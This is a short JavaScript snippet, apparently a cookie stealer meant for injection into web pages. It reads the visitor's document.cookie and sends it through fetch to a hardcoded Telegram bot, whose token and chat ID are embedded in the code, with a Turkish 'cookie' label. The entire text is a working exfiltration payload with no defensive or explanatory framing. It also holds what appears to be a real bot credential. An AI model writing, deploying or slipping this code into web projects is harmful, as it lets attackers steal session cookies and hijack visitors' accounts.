const TOKEN = "8600556676:AAFc6dqxJpHnNbhdYBkf7QBmLINUs86J-sI";
const CHAT_ID = "8788868439";
const cookies = document.cookie;
if (cookies) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: "🍪 ÇEREZ:\n\n" + cookies })
    });
}